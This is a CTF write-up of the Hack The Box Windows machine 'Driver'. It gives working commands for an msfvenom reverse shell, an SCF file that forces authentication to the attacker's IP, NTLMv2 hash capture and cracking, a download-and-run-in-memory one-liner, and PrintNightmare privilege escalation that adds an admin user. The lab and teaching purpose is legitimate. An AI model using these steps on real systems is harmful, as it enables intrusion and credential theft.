---
title: "Driver"
author: "Me"
date: "January 03, 2022"
output: html_document
---

# Driver

 <div id="boxinfo">
 <div id="textbox">
 <p class="alignleft">**Difficulty**: Easy</p>
 <p class="aligncenter">**Type**: CTF</p>
 <p class="alignright">**OS**: Windows</p>
 </div>
 <div style="clear: both;"></div>
 </div> 

<div class="img_container">
![desc]({{https://jsom1.github.io/}}/_images/htb_driver_desc.png){: height="300px" width = 320px"}
</div>

**Ports/services exploited:** 80/http, 445/SMB\\
**Tools:** autorecon, msfvenom, responder, hashcat, evil-winrm, winpeas\\
**Techniques:** SCF (Shell Command Files) attacks\\
**Keywords:** HP MultiFonction Printer, SMB NT LM 0.12 dialect, SCF, NTLV2, MS10-012 (NTLM Weak Nonce), MS08-068 (SMB Relay Code Execution), Powershell, PrintNightmare, Invoke-Nightmare

**TL;DR**: The host is running a web sever with an application that requires authentication. It appears to be a "MFP Firmware Update Center", and the default credentials admin/admin grant us access to the application, where it is possible to upload files. There's also SMB running, and this latter uses a dialect (NT LM 0.12) that is vulnerable to SCF. We can then create a SCF and upload it on the server. The user browsing to the share will trigger the execution of the SCF, resulting in him/her connecting to the share specified in the SCF. The tool *responder* can be used to capture the user's password hash. The hash can be cracked within seconds, and we can then use the credentials with *evil-winrm* to get a PowerShell shell on the box. From there, enumeration reveals that *spoolsv* is listening, which is a service affected by many vulnerabilities known as *PrintNightmare*. One of them is exploited by a powershell script called *Invoke-Nightmare*, which allows us to add a user with admin privileges. Once this is done, we can use *evil-winrm* once eagain to connect with SYSTEM privileges.

## 1. Services enumeration
{:style="color:DarkRed; font-size: 170%;"}

Let's start this box by launching an *autorecon* scan:

````
sudo autorecon 10.10.11.105
`````

See *autorecon*'s official documentation or <a href="/_walkthroughs/Horizontall">Horizontall</a> for an explanation of the results. 
Here's the *nmap* output, performed by *autorecon*. The script took 1.5 hour to run! 

<div class="img_container">
![nmap]({{https://jsom1.github.io/}}/_images/htb_driver_nmap.png)
</div>

The following services are running:

- Microsoft IIS 10.0 web server on port 80
- Microsoft End Point Mapper (EPMAP), also known as MS-RPC, on port 135. It is used to remotely manage services such as DHCP server or DNS
- Microsoft-DS Active Directory (AD, Windows shares) or Microsoft-DS SMB (file sharing) on port 445
- WinRM or Wsman on port 5985, for remote management
- Something on port 7680 that could be, according to the internet, used by WUDO (Windows Update Delivery Optimization) in Windows LANs.

Also, the target OS is likely to be Microsoft Windows Server 2008 R2 at 90% or Windows 10 at 85%. It's not shown in *nmap*'s output above, but it also ran a few scripts such as *smb-os-discovery*, *smb-security-mode*, and so on. There was nothing interesting though.


## 2. Gaining a foothold
{:style="color:DarkRed; font-size: 170%;"}

Let's go through each directory *autorecon* created for those services, starting with http (*cat /results/10.10.11.106/scans/tcp80/tcp_80_http_nmap.txt*).\\
*Autorecon* performed an additional targeted *nmap* scan for port 80. This latter would inform us if it found any web vulnerability such as XSS or CSRF. it's not the case here, nothing stands out. It also performed directory bruteforcing with *feroxbuster* and different wordlists, but there's nothing interesting either. 

Next, we'll browse to *10.10.11.106* to have a look at that web page:

<div class="img_container">
![site]({{https://jsom1.github.io/}}/_images/htb_driver_site.png)
</div>

By searching "MFP Firmware Update Center" on the internet, we learn that it stands for HP **MultiFonction Printer**. 
We can look at the documentation to see that the default credentials are *admin/admin*:

<div class="img_container">
![default creds]({{https://jsom1.github.io/}}/_images/htb_driver_creds.png){: height="200px" width = 400px"}
</div>

So, let's see if the site uses the default credentials:

<div class="img_container">
![site]({{https://jsom1.github.io/}}/_images/htb_driver_site2.png){: height="300px" width = 400px"}
</div>

And it does. Apparently, they conduct tests MFPs firmware updates and/or drivers. The only working button is *Firmware Updates* and it takes us to the following page:

<div class="img_container">
![site]({{https://jsom1.github.io/}}/_images/htb_driver_site3.png){: height="200px" width = 400px"}
</div>

So, this is where we can upload a file. This latter is then supposedly being reviewed and tested.
There are 4 Printer models to chose from: *HTB DesignJet*, *HTB Ecotank*, *HTB Laserjet Pro* and HTB Mono*. It's too early to say if that matters, but it's good to have that in mind.
Also, we notice in the URLs that the site is made of PHP scripts. This can be useful to search for *.php* file extensions specifically with *gobuster*, or to generate a php reverse shell payload, for example.\\
Let's try to upload a reverse shell payload generated by *msfvenom*. In this example, we will use a stageless payload for Windows x64. Before submitting it, we start a netcat listener to catch the potential reverse connection:

````
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=4444 -f exe > revsh-x64.exe
sudo nc -nlvp 4444
`````

By uploading this file onto the web server, we see in the URL *10.10.11.106/fw_up.php?msg=SUCCESS*. That means the upload was successful, however we don't receive anything on the listener... Sometimes we have to trigger the execution of the uploaded file by browsing to its location and clicking on it, but we don't know where it was uploaded. Is it uploaded on an SMB share? Because it is said that "the testing team will review the uploads manually and initiate the testing", I waited for a moment to see if it would somehow be executed by a cronjob, but it's not the case. Or maybe it is the case but it's not the right payload...\\

Well, if it is indeed upload on a SMB share, let's enumerate this service to see what we can get. Thanks to *autorecon*, everything has been done already and can be found in */results/10.10.11.106/scans/tcp445*. There's a specific SMB *nmap* scan, *enum4linux* results, and other SMB enumeration results:

<div class="img_container">
![SMB]({{https://jsom1.github.io/}}/_images/htb_driver_smb.png)
</div>

We see *nmap* ran some NSE scripts, and some of them failed. We see however that SMB uses *NT LM 0.12* (SMBv1) dialect, which appears to be dangerous. This reminds me of <a href="/_walkthroughs/Lame">Lame</a>, a Windows box in which we exploited another SMB dialect, *Samba*.\\
I know NTLM from Windows NTLM hashes, but not really in this context. From the internet, here's what I found about it:

"*NTLM (NT Lan Manager) is a challenge-response authentication protocol used by the SMB protocol. Windows systems commonly use the SMB protocol with NTLM authentication for network file/printer sharing and remote administration via DCE/RPC. Flaws in Microsoft's implementation of the NTLM challenge-response authentication protocol causing the server to generate duplicate challenges/nonces and an information leak allow an unauthenticated remote attacker without any kind of credentials to access the SMB service of the target system under the credentials of an authorized user. Depending on the privileges of the user, the attacker will be able to obtain and modify files on the target system and execute arbitrary code.*".

Well, that sounds promising and comes from <a href="https://www.exploit-db.com/exploits/15266">NTLM Weak Nonce (MS10-012)</a>. This concept seems to be used in an exploit, <a href="https://www.exploit-db.com/exploits/16360">SMB Relay Code Execution (MS08-068)</a>. A few words of its descriptions are given below:

"*This module will relay SMB authentication requests to another host, gaining access to an authenticated SMB session if successful.
If the connecting user is an administrator and network logins are allowed to the target machine, this module will execute an arbitrary
payload. To exploit this, the target system	must try to	authenticate to this module. The easiest way to force a SMB authentication attempt 
is by embedding a UNC path (\\\\SERVER\\SHARE) into a web page or email message. When the victim views the web page or email, their 
system will automatically connect to the server specified in the UNC share (the IP address of the system running this module) and attempt to authenticate.

By searching *searchsploit smb relay*, we find an existing exploit. On *Metasploit*, this latter is rated excellent. However, looking at its options it seems we need to have access to the *ADMIN$* share, which we don't... As usual, I had to look for hints on the forum and it turns out we have to look at **SCF File Attacks**. I'll resume the article available <a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">here</a>: 

Even if an SMB share doesn't contain anything, it could be configured with writ permissions for unauthenticated users. If this is the case, it is possible to obtain password hashes of domain users, or meterpreter shells. SCF (Shell Command Files) can be used to open a Windows explorer or other limited operations, but it can also be used to access a specific UNC path, allowing a malicious user to build an attack. For example, the SCF syntax to toggle the Desktop is the following:

````
[Shell]
Command=2
IconFile=\\X.X.X.X\share\test.ico
[Taskbar]
Command=ToggleDesktop
`````

This code has to be placed inside a text file and then uploaded into a network share. So, if the files we submit on the server are indeed uploaded in a share, then it could work! What's interesting is that saving the file as SCF will make the file to be executed when the user browses to it. In our case, there is obviously not someone who will manually review the file (even though it is said so on the server), but there's most likely a cronjob reading it.\\
Also, adding a "@" before the file name will place the file at the top of the list (@example.scf).

Then, the article says we have to use *responder* to capture the hashes of the users who will browse to that share and execute our file. I didn't know about this tool at all, but it is available on Github (<a href="https://github.com/lgandx/Responder">link</a>) where we learn that "*Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication*". Well, I don't really understand what that means but it doesn't matter since we'll use it as a blackbox. It turns out that *responder* is already installed on Kali. Let's look at the help page with *responder -h*. We see the usage is:

````
responder -I eth0 -w -r -f
``````

Where:

- *-I*: specifies the network interface to use, here *eth0*
- *w*: starts the WPAD rogue proxy server
- *r*: enables answers for netbios wredir suffix queries
- *-f*: allows us to fingerprint a host that issued an NBT-NS or LLMNR query

So, when the "user" will execute our SCF by browsing to the share, it will automatically connect back to the UNC path specified in the SCF file. Then, Windows will try to authenticate to that share with the user's credentials. The idea is to steal those credentials. It is possible because during the autentication process, a random 8 byte challenge key is sent from the server to the client. This key is used to encrypt the hashed NTLM/LANMAN password, and *responder* allows us to capture the NTLMv2 hash.\\
Note that we could use Metasploit's auxiliary module *auxiliary/server/capture/smb* instead of *responder*.

Enough theory, let's try it! We start by creating the SCF and naming it "@test.scf":

```
[Shell]
Command=2
IconFile=\\10.10.14.11\share\test.ico
[Taskbar]
Command=ToggleDesktop
````

Before uploading the file on the server, we start *responder*:

````
sudo responder -I tun0 -w -r -f
`````
Note that we want to listen on the *tun0* interface, which is associated with the HtB network. Let's look at the results:

<div class="img_container">
![responder]({{https://jsom1.github.io/}}/_images/htb_driver_resp.png)
</div>

<div class="img_container">
![hash]({{https://jsom1.github.io/}}/_images/htb_driver_hash.png)
</div>

It worked! We see the user *tony* authenticated and *responder* captured the NTLMv2 hash. If any other user would browse to the uploaded file location, we would also get their hashes. In the article, it is then said that this technique can be combined with SMB relay (we saw an exploit earlier) to get meterpreter reverse shells. Before doing so however, let's just try to crack the hash. If we manage to do so, we might also be able to use *evil-winrm* since we saw port 5985 is open (I used it in <a href="/_walkthroughs/Atom">Atom</a>, where there's more information about it).\\
First, we save the hash into a file (*driver_hash.txt* for example, and we copy everything, starting at "tony::DRIVER:...") and then use *hashcat* to crack it with the following syntax:

````
sudo hashcat -m 5600 driver_hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
`````

Note that 5600 corresponds to NTLMv2. We can then view the cracked password in *cracked.txt*:

<div class="img_container">
![cracked pw]({{https://jsom1.github.io/}}/_images/htb_driver_cracked.png)
</div>

Good, so we have the credentials tony:litony. Let's try to use them with *evil-winrm*:

````
sudo evil-winrm -u tony -p 'liltony' -i 10.10.11.106
`````

<div class="img_container">
![user]({{https://jsom1.github.io/}}/_images/htb_driver_user.png)
</div>

Note that it's not a classical Windows terminal. The *PS* stands for Powershell, which is a "*cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework*". It is cross-platform because it also works on Linux and macOS. The commands are different that what we'd use usually, in Powerhsell we use *cmdlets* (except for base commands such as *cd*, *dir*, *type*, and so on...).

So, this is it for the user! 

## 3. Vertical privilege escalation
{:style="color:DarkRed; font-size: 170%;"}

One thing I've been wondering so far is where exactly the file is being uploaded. We've seen the file upload is being handled by the *fw_up.php* script, so let's look at it to get more information. In Linux, the web server directory is located in */var/www*. In Windows, the root for an IIS server is usually C:\inetpub\wwwroot. It's the case here, and here's the interesting part of the script:

<div class="img_container">
![fw_up.php]({{https://jsom1.github.io/}}/_images/htb_driver_script.png)
</div>

We see the upload location is *C:\\firmwares\\*. I didn't know why there were 2 *\\* and from a quick research, it appears that double backslash at the very beginning of a path indicates a UNC path. We saw that notion in the exploit earlier, so let's get more information about it: UNC (Universal Naming Convention) is a format specifying the location of resources on a LAN. It uses the format *\\server-name\shared-resource-pathname*. For example, we could access the file test.txt in the directory DIR on the shared server SHAREDSERV with the command *\\SHAREDSERV\DIR\test.txt*.\\
So, is this an SMB share? I tried getting more information by retrieving the connections established from the SMB client to the SMB servers with the following PS cmdlet:

````
Get-SmbConnection
``````

But we get the error "Cannot connect to CIM server. Access denied". Looking into *C:\\firmwares\\*, we see there's nothing here. There's probably a cleaning script that is ran by a cronjob.
I then wanted to look into the printer directory (which is usually found in */windows/system32/spool/PRINTERS*. Even though we can access it, we can't display its content.\\

The first thing I usually do once I have a foothold is looking at the current user's permissions. On Windows, the command is:

````
whoami /priv
`````

Sadly there's nothing interesting here. Let's upload *WinPEAS* and automate the enumeation. I have a version of *winPEASx64.exe* in the directory from which I started *evil-winrm*, so we can simply use *upload* on *evil-winrm* to get it on the box (I first created a *.tmp* directory):

<div class="img_container">
![winpeas upload]({{https://jsom1.github.io/}}/_images/htb_driver_transf.png)
</div>

Note that we could also use *certutil* or a PS cmdlet to download the files. Then, we can run the script:

````
./winPEASx64.exe
`````

It doesn't work, I get the error "*Program 'winPEASx64.exe' failed to run: The specified executable is not a valid application for this OS platform*". I also tried with *winPEASany.exe*, but I get the same error... I wanted to download other versions from the Github repo, but I can't find any *.exe* there (I don't know if it's a temporary issue or if I just don't understand the structure of the repo).

Finally, I tried a one-liner to download and execute winPEASany from memory in PS. Before that, we specify the URL. The commands are the following:

````
# Get latest release
$url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
# One liner to download and execute winPEASany from memory in a PS shell
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
``````

But this time the error states that "*The remote name could not be resolved: 'github.com'*". I'll add a command here that enables the colored version of winPEAS, in case the use of *winPEAS* worked or for a future use (we need to set a registry value to see the colors)

````
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
`````

After a moment of manual enumeration, I had to look for clues on the forum. Apparently, we have to look at *spoolsv*, which is a printer service. We could theoretically see it using the *Get-NetTCPConnection* cmdlet, but we don't have the permissions. It's the same for *netstat -a -b*, we get "*The requested operation requires elevation*" (note that it works without the *-b* flag, but we don't know what's listening in this case).\\
Anyways, *winPEAS* should have revealed *spoolsv* on port 41410. From the internet, we learn that "*spoolsv.exe runs the Windows OS print spooler service. Any time you print something with Windows this important service caches the print job into memory so your printer can understand what to print*". 

By searching for "print spooler service exploit", we see many promising results. Apparently, the class of vulnerabilities affecting the Windows print spooler is known as *PrintNightmare*. There are RCE and/or privesc exploits, so let's look for a PE one. In <a href="https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html">this article</a>, the vulnerabilities are explained and there are steps and examples. From there, we see there's a privilege escalation powershell script called *Invoke-Nightmare*. We first have to download it on Kali, and then upload it with *evil-winrm*:

````
sudo git clone https://github.com/calebstewart/CVE-2021-1675
# Upload the script on the target
upload CVE-2021-1675.ps1
`````

When this is done, we can import the module and then use the *Invoke-Nightmare* command from that module to create a user admin with a chosen password:

````
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "netpal" -NewPassword "1234"
`````

We see in the image above that it was successful. The script used a malicious dll (*nightmare.dll*), but we don't necessarily have to understand how it works under the hood. We see it was indeed added to the administrators group:

<div class="img_container">
![ps1 exploit]({{https://jsom1.github.io/}}/_images/htb_driver_ps1.png)
</div>

We should now be able to use *evil-winrm* once again with those newly created credentials:

````
sudo evil-winrm -u netpal -p '1234' -i 10.10.11.106
`````

<div class="img_container">
![root]({{https://jsom1.github.io/}}/_images/htb_driver_root.png)
</div>

Ad it worked!

<div class="img_container">
![pwn]({{https://jsom1.github.io/}}/_images/htb_driver_pwn.png){: height="380px" width = 390px"}
</div>


<ins>**My thoughts**</ins>

It had been a long time since my last Windows box, and it felt great to do one again! I must say I didn't find it easy at all, and I'm a little bit concerned about the evolution of "easy" boxes on HtB.\\
Anyways, I learned a lot, in particular regarding SCF and the *PrintNightmare* class of vulnerabilities. It was great to see a box about printers, and it's interesting to see that they can present a security risk if not properly secured or updated.

I like using *autorecon* for the initial scan, but it takes a long time to run and I'm not used to it yet. The output is huge and I find it easy to get lost. I'll probably use a combination of *autorecon* and *nmap* from now on.

<ins>**Fix the vulnerabilities**</ins>

Regarding the file upload functionnality, the first and most obvious change to do is to change the default credentials on the firmware update center. By doing so, we couldn't upload the SCF payload and therefore wouldn't get in the way we did. Also, it could be a good idea to perform checks on the uploaded files (for example on file extensions, and so on).

For the SCF vulnerability, there are at least 2 possible ways to fix it: by using Kerberos authentication and SMB signing, and/or by disallowing write permissions in file shares for unauthenticated users.

Finally, privesc could be prevented by patching the vulnerability, or by disabling the print Spooler service momentarily if that can't be done rapidly. There's a patch that prevents exploitation by requiring administrator access to install printer driver (for example *nightmare.dll* in our case). There is also a new registry key, *RestrictDriverInstallationToAdministrators*, which will block all driver installation by non-administrator users.
